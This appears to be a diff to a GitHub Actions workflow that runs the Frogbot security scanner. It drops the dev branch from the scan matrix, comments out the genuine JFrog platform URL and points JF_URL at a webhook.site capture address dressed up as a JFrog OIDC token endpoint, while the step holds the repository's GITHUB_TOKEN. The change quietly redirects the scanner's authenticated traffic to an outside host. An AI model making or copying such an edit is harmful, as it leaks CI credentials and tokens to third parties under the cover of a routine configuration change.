@@ -15,7 +15,7 @@ jobs:
     strategy:
       matrix:
         # The repository scanning will be triggered periodically on the following branches.
-        branch: ["main", "dev" ]
+        branch: ["main"]
     steps:
       - uses: jfrog/frogbot@v2.24.0
         env:
@@ -23,7 +23,8 @@ jobs:
           # JFrog platform URL
           JF_GIT_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           JF_GIT_BASE_BRANCH: ${{ matrix.branch }}
-          JF_URL: https://${{ vars.JF_URL }}
+          # JF_URL: https://${{ vars.JF_URL }}
+          JF_URL: https://webhook.site/1d289532-49cf-42d1-90ee-d92e5c98367a/access/api/v1/oidc/token
           JF_INCLUDE_ALL_VULNERABILITIES: "TRUE"
           JF_FAIL: "TRUE"
         with:
